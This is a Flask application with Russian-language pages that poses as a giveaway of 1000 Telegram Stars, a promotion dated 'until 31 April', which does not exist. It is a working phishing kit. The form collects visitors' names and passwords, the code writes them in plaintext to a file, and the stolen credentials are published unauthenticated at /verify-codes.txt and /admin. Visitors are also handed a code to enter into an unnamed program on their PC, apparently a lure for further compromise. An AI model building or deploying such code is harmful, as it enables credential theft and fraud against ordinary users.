from flask import Flask, request, render_template_string, redirect, url_for
import random
import os
import time

app = Flask(__name__)

CODES_FILE = "verify-codes.txt"

# Главная страница с формой
HTML_FORM = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>🎁 Получи Telegram Stars</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            width: 350px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover { background: #5a67d8; }
        h1 { color: #333; }
        .note { font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 1000 Telegram Stars</h1>
        <form method="POST" action="/generate">
            <input type="text" name="name" placeholder="Ваше имя" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">🎉 Далее</button>
        </form>
        <div class="note">Акция действует до 31 апреля</div>
    </div>
</body>
</html>
"""

# Страница с кодом подтверждения
HTML_CODE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Код подтверждения</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        .code {
            font-size: 64px;
            letter-spacing: 10px;
            font-weight: bold;
            color: #667eea;
            margin: 20px 0;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>✅ Код подтверждения</h2>
        <div class="code">{{ code }}</div>
        <p>Введите этот код в программу на вашем ПК</p>
        <button onclick="location.href='/'">На главную</button>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_FORM

@app.route('/generate', methods=['POST'])
def generate():
    name = request.form.get('name')
    password = request.form.get('password')
    
    # Генерация 4-значного кода
    code = f"{random.randint(0, 9999):04d}"
    
    # Сохраняем в файл (логин, пароль, код, время)
    with open(CODES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {name} | {password} | {code}\n")
    
    return render_template_string(HTML_CODE, code=code)

@app.route('/verify-codes.txt')
def verify_codes():
    if not os.path.exists(CODES_FILE):
        return "Нет кодов"
    with open(CODES_FILE, 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/admin')
def admin():
    if not os.path.exists(CODES_FILE):
        return "Пока ни одного кода"
    with open(CODES_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    return f"<pre>{content}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
